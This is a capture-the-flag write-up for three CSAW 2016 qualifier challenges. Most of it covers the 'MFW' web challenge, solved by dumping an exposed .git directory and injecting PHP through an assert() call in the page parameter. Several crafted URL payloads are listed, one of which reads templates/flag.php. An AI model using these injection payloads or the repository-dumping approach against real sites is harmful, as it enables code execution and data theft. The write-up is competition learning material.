# CSAW Qualifiers 2016 File Dump

# "Notesy 2.0" 1: (Solved)

Problem: "Remember last year?"

Flag: `abcdefghijklmnopqrstuvwxyz`

# "Kill" Forensics 50: (Solved)

Problem: "Is kill can fix? Sign the autopsy file?"

Solution: File is a corrupted `.pcapng`.  It will not open in Wireshark or tcpdump.  File is readable in text editor.  Used `file_search.py` to find the flag.

Flag: `flag{roses_r_blue_violets_r_r3d_mayb3_harambae_is_not_kill}`


# "MFW" Web 125: (Solved)

Problem: "Hey, I made my first website today. It's pretty cool and web7.9."

Solution: Remote code execution through URL.  Attached Burp as a proxy to my browser.  Inspected the HTML, and notice possible `?/page=flag`.
The site also points out how it is built with git `http://web.chal.csaw.io:8000/.git/config` is accessible.  
I utilized a [DVCS-ripper](https://github.com/kost/dvcs-ripper) to download the repository.
Attempted file inclusion, but like the code shows it is not feasible.  
After anaylzing the code I ran it locally and tried many different URLs.  I added a debug line of `echo("<script>console.log( 'Debug Objects: " . assert("file_exists('$file')") . "' );</script>");`  I then ran the following urls:

1. `http://web.chal.csaw.io:8000/?page=phpinfo();`
2. `http://web.chal.csaw.io:8000/?page=http://web.chal.csaw.io:8000/templates/flag.php`
3. `http://web.chal.csaw.io:8000/?page=file_get_contents(%22/templates/flag.php%22);`
4. `http://web.chal.csaw.io:8000/?page= flag')%26%26file_get_contents('/templates/flag`
5. `http://web.chal.csaw.io:8000/?page=flag%27)||die(%27templates/flag`
6. `http://web.chal.csaw.io:8000/?page=flag%27%29||var_dump%28file_get_contents%28%27templates/flag.php%27%29%29;//`

The php code has [seemingly interesting defense](https://www.exploit-db.com/papers/12871/) built into it to distract someone at first through defeating a local file inclusion `assert("strpos('$file', '..') === false")`.
But `assert()` will execute PHP code, and thus that is it's weak point.

Flag: `flag{3vald_@ss3rt_1s_best_a$$ert}`
